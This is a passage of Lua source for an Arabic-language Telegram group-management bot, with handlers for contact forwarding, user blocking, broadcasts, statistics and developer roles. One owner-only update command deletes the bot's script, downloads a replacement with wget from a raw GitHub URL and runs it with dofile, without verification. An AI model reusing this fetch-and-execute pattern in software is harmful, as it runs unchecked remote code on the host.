local start = database:get(bot_id.."Start:Bot")  
if start then 
SourceMILANr = start
else
SourceMILANr = ' ゠ههلو عمري ↝⸼\n゠لتفعيل البوت في مجموعتك 𖧧.\n゠اضف البوت مشرف في مجموعتك 𖧧.\n゠ثم ارسل ◝ تفعيل ◟ 𖧧.'
end 
send(msg.chat_id_, msg.id_, SourceMILANr) 
end
end
database:setex(bot_id..'Start:Time'..msg.sender_user_id_,300,true)
return false
end
if not SudoBot(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
send(msg.sender_user_id_, msg.id_,'܁༯┆هلو عمري ↝ ܰ\n܁༯┆سيتم الرد عليك [قريباً . .](t.me/R_IQ9)')
tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = '📥┇ تم ارسال الملصق من ↓\n - '..Name
sendText(SUDO,Text,0,'md')
end 
end,nil) 
end,nil)
end
if SudoBot(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '📌┇ المستخدم » '..Name..'\n☑️┇تم حظره من التواصل '
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Ban:User_Bot',data.id_)  
return false  
end 
if text =='الغاء الحظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '📌┇ المستخدم » '..Name..'\n☑️┇ تم حظره من التواصل '
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:srem(bot_id..'Ban:User_Bot',data.id_)  
return false  
end 

tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
if ta.code_ == 400 or ta.code_ == 5 then
local MILAN_Msg = '\n⚠┇ فشل ارسال رسالتك لان العضو قام بحظر البوت'
send(msg.chat_id_, msg.id_,MILAN_Msg) 
return false  
end 
if text then    
send(id_user,msg.id_,text)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '📌┇ المستخدم » '..Name..'\n🔖┇تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end    
if msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '📌┇ المستخدم » '..Name..'\n🔖┇ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end      
if msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1, nil,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '📌┇ المستخدم » '..Name..'\n🔖┇ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '📌┇ المستخدم » '..Name..'\n🔖┇ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '📌┇ المستخدم » '..Name..'\n🔖┇ تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
end,nil)
end,nil)
end,nil)
end,nil)
end 
if text == '• تفعيل التواصل  𖡩 .' and SudoBot(msg) then  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n٭ 𖤹┆تم تفعيل التواصل ᜱ◜' 
else
Text = '\n٭ 𖤹┆تم تفعيل التواصل ᜱ◜'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == '• تعطيل التواصل  × .' and SudoBot(msg) then  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n٭ 𖤹┆تم تعطيل التواصل ☓◜' 
else
Text = '\n٭ 𖤹┆تم تعطيل التواصل ☓◜'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == '• تفعيل البوت الخدمي 𖤴 .' and SudoBot(msg) then  
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n܁༯┆تم تفعيل البوت لخدمي ↝ ܰ ' 
else
Text = '\n܁༯┆بلتأكيد تم تفعيل البوت الخدمي ↝ ܰ  '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == '• تعطيل البوت الخدمي 𖤴 .' and SudoBot(msg) then  
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n܁༯┆تم تعطيل البوت الخدمي ↝ ܰ ' 
else
Text = '\n܁༯┆بلتأكيد تم تعطيل البوت الخدمي ↝ ܰ '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'الغاء' or text == '• الغاء × .' then   
send(msg.chat_id_, msg.id_,'܁༯┆تم الغاء حفظ كليشه ستارت ↝ ܰ ')
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,'܁༯┆تم حفظ كليشةه حفظ ستارت ↝ ܰ ') 
database:del(bot_id..'Start:Bots') 
return false
end
if text == '• وضع كليشة 𖡲 start  .' and SudoBot(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,'܁༯┆ارسل الكليشةه الان ↝ ܰ ') 
return false
end
if text == '• حذف كليشة 𖡲 start  .' and SudoBot(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,'܁༯┆تم حذف كليشةه ستارت ↝ ܰ ') 
end

if text == '• معلومات السيرفر 𖥠 .' and SudoBot(msg) then 
send(msg.chat_id_, msg.id_, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '܁༯┆مدة تشغيل السيرفر ▾ .\n*▸  '"$linux_version"'*' 
echo '*܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀*\n܁༯┆الذاكره العشوائية ▾ .\n*▸ '"$memUsedPrc"'*'
echo '*܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀*\n܁༯┆وحدة التخزين ▾ .\n*▸ '"$HardDisk"'*'
echo '*܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀*\n܁༯┆المعالج ▾ .\n*▸ '"`grep -c processor /proc/cpuinfo`""Core ▸ $CPUPer% "'*'
echo '*܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀*\n܁༯┆الدخول ▾ . \n*▸ '`whoami`'*'
echo '*܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀*\n܁༯┆مدة تشغيل السيرفر ▾ .\n*▸ '"$uptime"'*'
]]):read('*all'))  
end

if text == '• تحديث السورس ᜱ .' and SudoBot(msg) then 
os.execute('rm -rf MILAN.lua')
os.execute('wget https://raw.githubusercontent.com/MILANTEAM/MILAN/master/MILAN.lua')
send(msg.chat_id_, msg.id_,'✥┆ تم تحديث السورس . 𖦲 ◜')
dofile('MILAN.lua')  
end
if text == "• وضع اسم الى البوت 𖠹 ." and SudoBot(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"܁༯┆ارسل الاسم الان ↝ ܰ ")  
return false
end
if text == '• الاحصائيات 𖡬 .' and SudoBot(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '┐ عدد المجموعات ◃ ◞*'..Groups..'*◜ \n✛ ٭                  ٭ \n┘ عدد المشتركيين ◃ ◞*'..Users..'*◜ .'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == '• المشتركيين 𖡹 .' and SudoBot(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n٭ 𖡹 ┆عدد المشتركيين ◃ ◞ *'..Users..'* ◜'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == '• المجموعات 𖡹 .' and SudoBot(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n٭ 𖡹 ┆عدد المجموعات ◃ ◞ *'..Groups..'* ◜'
send(msg.chat_id_, msg.id_,Text) 
return false
end
if text == ("• المطورين 𖤂 .") and SudoBot(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n܁༯┆قائمة المطورين ↝↝ .\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜*@"..username.."*◞  ↝🦄 .\n"
else
end
end
if #list == 0 then
t = "٭ 𖤹┆لا يوجد مطوريين ☓◟"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("• قائمة العام 𖤹 .") and SudoBot(msg) then
local list = database:smembers(bot_id..'GBan:User')
t = "\n܁༯┆قائمة العام ↝↝ .\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜*@"..username.."*◞  ↝🦄 .\n"
else
end
end
if #list == 0 then
t = "٭ 𖤹┆لا يوجد احد محظور عام ☓◟"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text=="• اذاعة في الخاص 𖡮  ." and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"܁༯┆هلو عمري ↝ ܰ\n܁༯┆ارسل لي سواء كان . .\n܁༯┆ملصق ◃ متحركة ◃ فيد ◃ صوره ◃ رسالة ܊\n܁༯┆للخروج ارسل ܊ الغاء ܊") 
return false
end 
if text=="• اذاعة 𖡮  ." and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"܁༯┆هلو عمري ↝ ܰ\n܁༯┆ارسل لي سواء كان . .\n܁༯┆ملصق ◃ متحركة ◃ فيد ◃ صوره ◃ رسالة ܊\n܁༯┆للخروج ارسل ܊ الغاء ܊") 
return false
end  
if text=="• اذاعة بالتوجية  𖣮  ." and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"܁༯┆ارسل لي التوجيه الان ↝ ܰ") 
return false
end 
if text=="• اذاعة بالتوجية في الخاص 𖣮  ." and msg.reply_to_message_id_ == 0  and SudoBot(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"܁༯┆ارسل لي التوجيه الان ↝ ܰ") 
return false
end 
if text == '• جلب النسخة الاحتياطية 𖥠 .' and SudoBot(msg) then 
GetFile_Bot(msg)
end
if text == "• تنظيف المشتركيين 𖤸 ." and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
local pv = database:smembers(bot_id.."User_Bot")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
database:srem(bot_id.."User_Bot",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'܁༯┆لايوجد مشتركين وهميين في البوت ↝ ܰ ')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'܁༯┆عدد المشتركين  ◃ ⸼ '..#pv..' ⸼\n܁༯┆تم ازالة ◃ ⸼ '..sendok..' ⸼ من المشتركين\n܁༯┆عدد المشتركين الحقيقي ◃ ⸼ '..ok..' ⸼')   
end
end
end,nil)
end,nil)
end
return false
end
if text == "• تنظيف الكروبات 𖤸 ." and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
local group = database:smembers(bot_id..'Chek:Groups') 
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',group[i])  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=group[i],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'܁༯┆لايوجد مجموعات وهميه في البوت↝ ܰ')   
else
local MILAN = (w + q)
local sendok = #group - MILAN
if q == 0 then
MILAN = ''
else
MILAN = '\n܁༯┆ تم ازالة ['..q..'](t.me/R_IQ9) مجموعات من البوت ↝ ܰ'
end
if w == 0 then
MILANk = ''
else
MILANk = '\n܁༯┆ تم ازالة ['..w..'](t.me/R_IQ9) مجموعات من البوت ↝ ܰ'
end
send(msg.chat_id_, msg.id_,'')   
end
end
end,nil)
end
return false
end
if text and text:match("^رفع مطور @(.*)$") and SudoBot(msg) then
local username = text:match("^رفع مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه  ↝ ܰ")   
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'R_IQ9')..')'
status  = '\n☑️┇ تم ترقيته مطور في البوت'
texts = usertext..status
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور (%d+)$") and SudoBot(msg) then
local userid = text:match("^رفع مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n☑️┇ تم ترقيته مطور في البوت'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n👤┇ العضو » '..userid..''
status  = '\n☑️┇ تم ترقيته مطور في البوت'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text and text:match("^تنزيل مطور @(.*)$") and SudoBot(msg) then
local username = text:match("^تنزيل مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Sudo:User', result.id_)
usertext = '\n👤┇ العضو » ['..result.title_..'](t.me/'..(username or 'R_IQ9')..')'
status  = '\n☑️┇ تم تنزيله من المطورين'
texts = usertext..status
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مطور (%d+)$") and SudoBot(msg) then
local userid = text:match("^تنزيل مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'🔖┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n📤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n☑️┇ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n👤┇العضو » '..userid..''
status  = '\n☑️┇ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end

end
--------------------------------------------------------------------------------------------------------------
if text and not Special(msg) then  
local MILAN1_Msg = database:get(bot_id.."MILAN1:Add:Filter:Rp2"..text..msg.chat_id_)   
if MILAN1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┇ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'R_IQ9')..') \n 📬┇'..MILAN1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
end
if database:get(bot_id..'Set:Name:Bot'..msg.sender_user_id_) then 
if text == 'الغاء' or text == '• الغاء × .' then   
send(msg.chat_id_, msg.id_,"܁༯┆تم الغاء حفط اسم البوت ↝ ܰ") 
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
return false  
end 
database:del(bot_id..'Set:Name:Bot'..msg.sender_user_id_) 
database:set(bot_id..'Name:Bot',text) 
send(msg.chat_id_, msg.id_, "܁༯┆تم حفظ اسم البوت ↝ ܰ")  
return false
end 
if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == '• الغاء × .' then   
send(msg.chat_id_, msg.id_,"܁༯┆تم الغاء الاذاعةه خاص ↝ ܰ") 
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'User_Bot') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_,"܁༯┆تم الاذاعة الى ◃ ˼ "..#list.." ˹ مشترك في البوت ↝ ܰ ")     
database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if database:get(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == '• الغاء × .' then   
send(msg.chat_id_, msg.id_,"܁༯┆تم الغاء الاذاعةه ↝ ܰ") 
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'Chek:Groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,'['..msg.content_.text_..']')  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
send(msg.chat_id_, msg.id_,"܁༯┆تم الاذاعة الى ◃ ˼ "..#list.." ˹  مجموعات في البوت ↝ ܰ")     
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end

if database:get(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == '• الغاء × .' then   
send(msg.chat_id_, msg.id_,"܁༯┆تم الغاء الاذاعةه ↝ ܰ") 
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'Chek:Groups')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_,"܁༯┆تم الاذاعة الى ◃ ˼ "..#list.." ˹  مجموعات في البوت ↝ ܰ")     
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' or text == '• الغاء × .' then   
send(msg.chat_id_, msg.id_," ܁༯┆تم الغاء الاذاعةه ↝ ܰ") 
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id..'User_Bot')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
send(msg.chat_id_, msg.id_,"܁༯┆تم الاذاعة الى ◃ ˼ "..#list.." ˹ مشترك في البوت ↝ ܰ ")     
database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
if database:get(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "܁༯┆تم الغاء الامر ↝ ܰ") 
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local username = string.match(text, "@[%a%d_]+") 
tdcli_function ({    
ID = "SearchPublicChat",    
username_ = username  
},function(arg,data) 
if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
send(msg.chat_id_, msg.id_, '܁༯┆المعرف لايوجد فيه قناة↝ ܰ ')
return false  end
if data and data.type_ and data.type_.ID and data.type_.ID == 'PrivateChatInfo' then
send(msg.chat_id_, msg.id_, '܁༯┆هذا معرف حساب خلي قناه 🙂↝ ܰ ') 
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'܁༯┆عذرا لايمكنك وضع معرف مجموعةه ارسل معرف قناه↝ ܰ ') 
return false  end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
send(msg.chat_id_, msg.id_,'܁༯┆ههلو ععمري ↝\n܁༯┆البوت ادمن في القناة \n܁༯┆تم تفعيل الاشتراك بنجاح . ') 
database:set(bot_id..'add:ch:id',data.id_)
database:set(bot_id..'add:ch:username','@'..data.type_.channel_.username_)
else
send(msg.chat_id_, msg.id_,'܁༯┆البوت ليس ادمن يرجى ترقيتي واعد المحاوله ↝ ܰ ') 
end
return false  
end
end,nil)
end
if database:get(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "📬┇ تم الغاء الامر ") 
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
database:set(bot_id..'text:ch:user',texxt)
send(msg.chat_id_, msg.id_,'܁༯┆ تم تغيير رسالة الاشتراك بنجاح ↝ ܰ ')
end

local status_welcome = database:get(bot_id..'Chek:Welcome'..msg.chat_id_)
if status_welcome and not database:get(bot_id..'lock:tagservr'..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
local GetWelcomeGroup = database:get(bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
